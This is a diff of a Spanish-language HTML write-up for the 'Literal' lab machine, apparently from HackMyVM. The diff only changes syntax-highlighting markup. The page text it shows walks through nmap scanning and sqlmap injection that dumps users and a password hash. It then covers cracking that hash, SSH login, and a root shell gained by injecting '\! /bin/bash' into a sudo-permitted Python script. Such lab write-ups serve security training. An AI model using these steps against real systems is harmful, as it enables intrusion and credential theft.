@@ -19,7 +19,8 @@
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
     
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
     <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
 </head>
 <body>
@@ -45,7 +46,7 @@ PORT   STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre">
-<code class="language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.14
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.14
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
@@ -61,7 +62,7 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre>
             <h3>HTTP</h3>                
-            <p>Si intento ir a la web me redirige automáticamente al subdominio<code class="code_negrita">&nbsp;blog.literal.hmv</code>.</p>
+            <p>Si intento ir a la web me redirige automáticamente al subdominio<code class="code_negrita">&nbsp;blog.literal.hmv&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/hmv_literal/puerto80.png" alt="puerto80">
             <p>Añado el subdominio encontrado al archivo<code class="code_negrita">&nbsp;hosts&nbsp;</code>y me conecto de nuevo a la web.</p>
             <img class="img_b" src="../../assets/img/hmv_literal/blog.png" alt="blog">
@@ -72,7 +73,7 @@ Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <p>Después de interceptar la petición con burpsuite la guardo a un fichero con<code class="code_negrita">&nbsp;copy to file&nbsp;</code>y le doy el nombre de burp.</p>
             <img class="img_b" src="../../assets/img/hmv_literal/burpcaptura.png" alt="burpcaptura">
             <p>Ahora utilizo el fichero que he guardado anteriormente para usarlo con sqlmap y buscar el nombre de la base de datos.</p>
-<pre class="pre"><code class="language-js">❯ sqlmap -r burp --level 5 --risk 3 --dbs
+<pre class="pre"><code class="code language-txt">❯ sqlmap -r burp --level 5 --risk 3 --dbs
 [20:27:45] [INFO] fetching database names
 available databases [4]:
 [*] blog
@@ -81,7 +82,7 @@ available databases [4]:
 [*] performance_schema
 </code></pre>
             <p>Buscando las tablas de blog.</p>
-<pre class="pre"><code class="language-js">❯ sqlmap -r burp --level 5 --risk 3 -D blog --tables
+<pre class="pre"><code class="code language-txt">❯ sqlmap -r burp --level 5 --risk 3 -D blog --tables
 
 [20:31:17] [INFO] fetching tables for database: 'blog'
 Database: blog
@@ -92,20 +93,20 @@ Database: blog
 +----------+
 </code></pre>
             <p>Dumpeando users.</p>
-<pre class="pre"><code class="language-js">❯ sqlmap -r burp --level 5 --risk 3 -D blog -T users --dump
+<pre class="pre"><code class="code language-txt">❯ sqlmap -r burp --level 5 --risk 3 -D blog -T users --dump
 </code></pre>
             <img class="img_b" src="../../assets/img/hmv_literal/dump_db_blog.png" alt="dump_db_blog">
             <p>Encuentro dos usuarios con un nuevo subdominio.</p>
-<pre class="pre"><code class="language-js">| 8      | walter    | walter@forumtesting.literal.hmv
+<pre class="pre"><code class="code language-txt">| 8      | walter    | walter@forumtesting.literal.hmv
 | 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv
 </code></pre>
 
             <p>Añado el subdominio a mi archivo<code class="code_negrita">&nbsp;hosts&nbsp;</code>y me conecto a el.</p>
             <img class="img_b" src="../../assets/img/hmv_literal/forumtesting.png" alt="forumtesting">
-            <p>Le doy click a<code class="code_negrita">&nbsp;categories&nbsp;</code>y veo el parámetro<code class="code_negrita">&nbsp;category_id=2</code>.</p>
+            <p>Le doy click a<code class="code_negrita">&nbsp;categories&nbsp;</code>y veo el parámetro<code class="code_negrita">&nbsp;category_id=2&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/hmv_literal/forumtesting_category.png" alt="forumtesting_category">
-            <p>Encuentro la base de datos<code class="code_negrita">&nbsp;forumtesting</code>.</p>
-<pre class="pre"><code class="language-js">sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --level 5 --risk 3 --dbs
+            <p>Encuentro la base de datos<code class="code_negrita">&nbsp;forumtesting&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --level 5 --risk 3 --dbs
 
 [21:01:30] [INFO] retrieved: forumtesting
 available databases [3]:
@@ -115,7 +116,7 @@ available databases [3]:
 </code></pre>
 
             <p>Obtengo las tablas.</p>
-<pre class="pre"><code class="language-js">❯ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --level 5 --risk 3 -D forumtesting --tables
+<pre class="pre"><code class="code language-txt">❯ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --level 5 --risk 3 -D forumtesting --tables
 
 [21:04:36] [INFO] retrieved: forum_users
 Database: forumtesting
@@ -131,7 +132,7 @@ Database: forumtesting
 
 
             <p>Dumpeo<code class="code_negrita">&nbsp;forum_owner&nbsp;</code>y obtengo un hash para carlos.</p>
-<pre class="pre"><code class="language-js">❯ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --level 5 --risk 3 -D forumtesting -T forum_owner --dump
+<pre class="pre"><code class="code language-txt">❯ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --level 5 --risk 3 -D forumtesting -T forum_owner --dump
 
 [21:07:43] [INFO] retrieved: 2022-02-12
 [21:07:43] [INFO] retrieved: carlos@forumtesting.literal.htb
@@ -142,7 +143,7 @@ Database: forumtesting
 </code></pre>
 
             <p>Para romper el hash usaré el mismo sqlmap ya que nos ofrece esa opción y es bastante intuitivo.</p>
-<pre class="pre"><code class="language-js">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+<pre class="pre"><code class="code language-txt">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 [21:14:27] [INFO] writing hashes to a temporary file '/tmp/sqlmaps0oti3_q65473/sqlmaphashes-9njg5mis.txt' 
 do you want to crack them via a dictionary-based attack? [Y/n/q] y
 [21:14:28] [INFO] using hash method 'sha512_generic_passwd'
@@ -160,7 +161,7 @@ do you want to use common password suffixes? (slow!) [y/N] n
 [21:15:13] [INFO] cracked password 'forum******' for user 'carlos'
 </code></pre><i class="cursiva">Este paso es un poco troll porque una vez obtienes la contraseña hay que deducir que formato tendría la contraseña para SSH. Digamos que se puede reutilizar pero cambiando algunos carácteres.</i>
             <p>Me conecto al sistema y verifico que permisos tengo con sudo.</p>
-<pre class="pre"><code class="language-js">carlos@literal:~$ sudo -l
+<pre class="pre"><code class="code language-txt">carlos@literal:~$ sudo -l
 Matching Defaults entries for carlos on literal:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
     
@@ -168,8 +169,8 @@ User carlos may run the following commands on literal:
     (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
 </code></pre>
 
-            <p>Archivo<code class="code_negrita">&nbsp;update_project_status.py</code>.</p>
-<pre class="pre"><code class="language-python">#!/usr/bin/python3
+            <p>Archivo<code class="code_negrita">&nbsp;update_project_status.py&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-python">#!/usr/bin/python3
 
 # Learning python3 to update my project status
 ## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P
@@ -260,7 +261,7 @@ main()
 </code></pre>
 
             <p>Obtengo el root de la siguiente forma.</p>
-<pre class="pre"><code class="language-js">carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '\! /bin/bash' 'To do'
+<pre class="pre"><code class="code language-txt">carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '\! /bin/bash' 'To do'
 [+] Before update project (\! /bin/bash)
     
 root@literal:/home/carlos# id;hostname
@@ -274,7 +275,8 @@ literal
     </main>
         <footer class="footer">
             <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
-            <script src="../../assets/js/prism.js"></script> 
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script>
 
         </footer>  
 </body>
